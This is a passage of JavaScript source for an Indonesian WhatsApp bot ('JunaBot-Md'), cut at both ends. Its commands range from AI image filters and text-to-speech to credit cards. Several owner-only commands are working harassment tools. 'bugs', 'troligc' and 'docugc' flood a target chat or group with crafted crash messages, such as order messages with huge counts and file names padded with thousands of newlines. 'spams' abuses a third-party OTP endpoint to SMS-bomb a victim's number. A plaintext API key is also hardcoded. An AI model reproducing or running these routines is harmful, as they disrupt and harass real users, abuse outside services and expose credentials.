"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `*https://wa.me/settings*\n𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙 ${ngazap(prefix)}`,
}
}), { userJid: m.chat, quoted: m })
juna.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
}
newReply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
break
case 'bugs':
if (!isCreator) return newReply('Khusus Premium!') 
if (args.length == 0) return newReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙`
for (let i = 0; i < jumlah; i++) {
juna.sendMessage(m.chat, {sticker: {url: `${setting.pathimg}`}},{'quoted': {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
break
case 'spams': {
if (!isCreator) return newReply('*khusus Owner*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms.startsWith('+6285600793871')) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
});
}
} else newReply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
newReply(`spam sms/call akan di kirim ke no target`)
}
break
case 'juna':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply('Bugg Cuyy Awokwok😱')
juna.sendMessage(m.chat, {
    'text': 'Iya'
  }, {
    'quoted': junaa
  })
  }
break
case 'troligc': {
if (!isCreator) return newReply('*khusus Owner*')
if (!args[0]) return newReply(`Penggunaan ${prefix+command} id group\nContoh ${prefix+command} 12036316943016488`)
newReply(`Proses`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ngazap(prefix)}`,jpegThumbnail: pathimg}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${ngazap(prefix)}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6285600793871@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted : junaa})
juna.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
newReply(`*Sukses mengirim Bug Ke ${bnnd} Kasih Jeda Ya Om:3*`)
}
break
case 'docugc': {
if (!isCreator) return newReply('*khusus Owner*')
if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} id gc\nContoh ${prefix+command} 12036316943016488`)
newReply('Proses') 
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botName}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${ngazap(prefix)}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botName} ${ngazap(prefix)}`,
}
}), { userJid: m.chat, quoted:junaa})
juna.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
newReply(`*Sukses mengirim Bug Ke ${bnnd} Kasih Jeda Ya Om:3*`)
}
break
case 'tqto':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
var tqto =`0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Big Thanks To 」*
│ _*• My God*_
│ _*• My Parents*_
│ _*• My Friend & All User Bot*_
│ _*• Zeeoneofc*_
│ _*• Skizo Team*_
│ _*• Zahwazein*_
│ _*• Ekuzika*_
│ _*• Syaii*_
│ _*• ChaikalOffc*_
│ _*• El Danz*_
│ _*• YanzDev*_
│ _*• Arifzyn*_
│ _*• Junn*_
│ _*• Myself*_
│ _*• And Other All Bot Creators*_
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
var result = [
`𝐌𝐲 𝐆𝐨𝐝`, 
`𝐌𝐲 𝐏𝐚𝐫𝐞𝐧𝐭𝐬`, 
`𝐌𝐲 𝐅𝐫𝐢𝐞𝐧𝐝𝐬 & 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫 𝐁𝐨𝐭`, 
`𝐙𝐞𝐞𝐨𝐧𝐞𝐨𝐟𝐜`, 
`𝐒𝐤𝐢𝐳𝐨 𝐓𝐞𝐚𝐦`, 
`𝐙𝐚𝐡𝐰𝐚𝐳𝐞𝐢𝐧`, 
`𝐄𝐤𝐮𝐳𝐢𝐤𝐚`, 
`𝐒𝐲𝐚𝐢𝐢`, 
`𝐂𝐡𝐚𝐢𝐤𝐚𝐥𝐎𝐟𝐟𝐜`, 
`𝐄𝐥 𝐃𝐚𝐧𝐳`, 
`𝐘𝐚𝐧𝐳𝐃𝐞𝐯`, 
`𝐀𝐫𝐢𝐟𝐳𝐲𝐧`, 
`𝐉𝐮𝐧𝐧`, 
`𝐌𝐲𝐬𝐞𝐥𝐟`, 
`𝐀𝐧𝐝 𝐎𝐭𝐡𝐞𝐫 𝐀𝐥𝐥 𝐁𝐨𝐭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫𝐬`, 
`${tqto}`
]
let { key } = await juna.sendMessage(m.chat, {text: '𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 :'}, {quoted:m})

for (let i = 0; i < result.length; i++) {
await sleep(1000)
await juna.sendMessage(m.chat, {text: result[i], edit: key }, {quoted:m});
}
}
break
case 'intro':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
var intro =`0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
juna.sendMessage(m.chat, {text: intro }, {quoted: fkontak})
}
break
case'tes': case'test':
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#tes', m.sender, _cmd)
juna.sendMessage(m.chat, {text: `${setting.botName} 𝙊𝙣 𝘽𝙤𝙨𝙠𝙪\n𝙒𝙖𝙠𝙩𝙪 𝙊𝙣𝙡𝙞𝙣𝙚 : ${runtime(process.uptime())}`}, {quoted: fkontak})
break
case'simiv': case 'simivoice':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return ('Iya kak?') 
await juna.sendPresenceUpdate('recording', m.chat);
let simi = await fetchJson(`https://api.junn4.my.id/ai/simi?text=${q}`)
const text = simi.result
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
newReply(e + '')
res = await tts(text)
} finally {
juna.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {quoted:m})
}
limitAdd(m.sender, limit)
}
limitAdd(m.sender, limit)
break
case 'bot':

case 'simi':

    try {

        if (isBan) return newReply('Lu di ban kocak awokwok') 

        if (!text) return newReply('Iya kak?')

        if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)

        let result = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=6b882dde90583a8ea51d4fcf&text=${q}&badword=false`)

        if (!result.result) return newReply('ngetik yang bener njenk🥵🥵')

        const gpt = result.result

        newReply(`${gpt}`)

    } catch (err) {

        console.log(err)

        newReply('Terjadi Kesalahan')

    }

    break;

limitAdd(m.sender, limit)

break
case 'bokep': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
const fs = require('fs');
if (!m.isGroup)return newReply(mess.OnlyGrup)
if (!isCreator&&!isPremium) return newReply('Tobat Bro Jangan Bokep Mulu:v')
await newReply(mess.wait)
let istighfar = fs.readFileSync('./media/Astaghfirullah.mp4')
let ban = m.mentionedJid[0] || m.sender || conn.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await juna.sendFile(ban, istighfar, 'astagfirullah.mp4', `Tobat Broo:v`, m)
return newReply(`Silahkan Cek Di Private Chat:v`) 
}
break
case 'listbahasa':
if (isBan) return newReply('Lu di ban kocak awokwok') 
addCountCmd('#listbahasa', m.sender, _cmd)
var clear = ["auto", "isSupported", "getCode"]
var teks = `List Bahasa Yang Tersedia\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
newReply(teks)
break
case 'differentme': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
try{
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirror?&apikey=${setting.XznKey}&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
juna.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
newReply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n- anime_2d\n- cartoon_3d\n- pretty_soldier\n- bizarre\n- romance_comic\n- maid_dressing\n- superhero_comic\n- watercolor\n- doodle\n- america_comic\n- starry_girl`)
}
}
break
case 'differentme2': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
try{
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirrorvip?&apikey=${setting.XznKey}&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
juna.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
newReply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n- gta5\n- dball\n- naruto\n- cyber\n- killer\n- kyoto\n- bikini\n- iron`)
}
}
break
case 'diffusion': case 'stabledif': case 'diff':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
m.reply(mess.wait)
try {
let anu = await diff(text)
let hasil = await processing(anu, "enhance");
juna.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
     } catch (e) {
m.reply(eror)
}
}
break
case'txt2img':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) throw 'Masukan Promptnya\nExample:\n1girl, with glasses, in beach'
juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let api = await fetchJson(`https://api.junn4.my.id/ai/txt2img?prompt=${text}&model=Realistic_Vision_V1.4-pruned-fp16`)
await juna.sendMessage(m.chat, {image: {url: api.result.imageUrl}, caption: `Done.`},{quoted: m})
juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (e) {
juna.sendMessage(m.chat, { react: { text: `❎`, key: m.key }})
}
}
break
case 'aiscene': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses')
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Bruh Kalo Jelek Maapin Ya:<'}, { quoted: m})
}
break
case 'toanime': case 'jadianime': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/toanime?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
}
break
case 'nobg': case 'removebg':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
